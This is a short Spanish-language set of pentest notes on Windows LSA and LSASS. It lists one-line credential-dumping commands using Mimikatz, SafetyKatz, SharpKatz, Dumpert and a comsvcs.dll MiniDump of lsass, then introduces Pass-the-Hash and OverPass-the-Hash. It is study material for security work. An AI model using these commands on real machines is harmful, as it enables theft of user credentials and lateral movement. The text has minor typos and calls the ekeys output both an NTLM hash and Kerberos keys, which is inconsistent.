## LSA y LSASS
La **Autoridad de Seguridad Local (LSA)** es un componente clave del subsistema de seguridad de Windows, responsable de aplicar las políticas de seguridad, gestionar la autenticación y almacenar datos confidenciales como credenciales de usuario y tokens de seguridad. Desempeña un papel fundamental en el procesamiento de solicitudes de autenticación, la verificación de identidades de usuario y la interacción con Active Directory en entornos de dominio.

El **Servicio de Subsistema de Autoridad de Seguridad Local (LSASS)** es el proceso `lsass.exe`que ejecuta LSA en modo usuario. Se encarga de autenticar usuarios, gestionar tokens de acceso y almacenar hashes de credenciales en memoria. Debido a su función crítica, LSASS es un objetivo de alto valor para los atacantes que buscan extraer credenciales, realizar ataques de robo de hash o manipular mecanismos de autenticación. Proteger LSASS es fundamental para mantener la seguridad del sistema, por lo que las versiones modernas de Windows implementan protecciones como Credential Guard y restricciones de memoria para LSASS.

## Extracción de credenciales de LSASS
> Se necesita acceso de administrador en una maquina

### Mimikatz
Para extraer por ejemplo el has NTLM de LSASS en una maquina local usando `Invoke-Mimikatz` hace falta ejecutar:
```shell
Invoke-Mimikatz -Command "sekurlsa::ekeys"
```

El comando ejecuta *Mimikatz* usando la opción de `-Command` para interactuar con el proceso de *LSASS* a través de `sekurlsa` que es donde Windows guarda las credenciales en memoria y usa `ekeys` para extraer las claves de cifrado de Kerberos de las sesiones activas

Tambien se puede ejecutar con 
### SafetyKatz
```shell
SafetyKatz.exe "sekurlsa::ekeys"
```

### SharpKatz
```shell
SharpKatz.exe --Command ekeys
```

### Dumpert
```shell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

### Comsvcs.dll
```shell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass PID> C:\Users\Public\lsass.dmp full
```

Después de obtener unas credenciales con cualquiera de las herramientas y variables podemos usar *Pass-the-Hash / Pass-the-Ticket / OverPass-the-Hash*

Para realizar **OverPass-The-Hash (OPTH)** primero hay que entenderolo, este ataque permite a los atacantes generar tokens de autenticacion a traves de hashes NTLM o claves Jerberos. Requiere de permisos de administrador mediante *Mimikatz/Safety-Katz* pero en cambio no requiere de elevacion de privilegios si se hace mediante *Rubeus*
